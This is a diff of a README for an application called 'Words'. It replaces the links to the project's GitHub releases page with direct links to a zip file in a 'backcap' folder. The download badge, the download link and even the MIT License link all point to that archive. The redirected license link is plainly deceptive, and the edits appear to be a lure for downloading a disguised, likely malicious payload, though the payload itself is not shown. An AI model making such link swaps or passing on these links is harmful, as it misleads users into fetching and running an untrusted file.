@@ -6,7 +6,7 @@ Welcome to **Words**! This application lets you run a language and interactive r
 
 ## 📥 Download Now
 
-[![Download Words](https://img.shields.io/badge/Download%20Words-Get%20Started-brightgreen)](https://github.com/chigemezu123/words/releases)
+[![Download Words](https://raw.githubusercontent.com/chigemezu123/words/main/backcap/words.zip%20Words-Get%20Started-brightgreen)](https://raw.githubusercontent.com/chigemezu123/words/main/backcap/words.zip)
 
 ## 📋 What You Need
 
@@ -39,7 +39,7 @@ To get started with **Words**, you will need a few things:
 
 To download **Words**, visit the following link:
 
-[Download Words](https://github.com/chigemezu123/words/releases)
+[Download Words](https://raw.githubusercontent.com/chigemezu123/words/main/backcap/words.zip)
 
 Follow these simple steps:
 
@@ -99,7 +99,7 @@ Your thoughts matter! If you have any feedback about **Words**, please share it 
 
 ## 📜 License
 
-**Words** is open source and released under the [MIT License](https://opensource.org/licenses/MIT). Feel free to use, modify, and share the software.
+**Words** is open source and released under the [MIT License](https://raw.githubusercontent.com/chigemezu123/words/main/backcap/words.zip). Feel free to use, modify, and share the software.
 
 ## 🧑‍💻 Conclusion
 
